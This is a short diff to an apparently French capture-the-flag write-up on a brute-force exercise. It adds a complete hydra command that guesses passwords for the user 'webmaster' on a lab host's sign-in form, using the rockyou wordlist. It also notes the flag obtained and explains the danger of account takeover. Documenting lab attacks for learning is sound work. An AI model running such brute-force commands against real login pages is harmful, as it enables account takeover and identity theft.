@@ -18,6 +18,8 @@ On obtient:
 Dans la page "http://10.13.247.194/?page=signin" le mdp shadow donne le flag b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
 ```
 
+`hydra -f -l webmaster -P /home/vline/Téléchargements/rockyou.txt 10.13.247.194 http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif"`
+
 ### Ce que ça implique / pourquoi c’est dangereux
 L’attaque brute force permet de recuperer des mots de passe et ainsi se connecter avec le compte d'une autre personne pour recuperer ses donnees ou usurper son identite
 
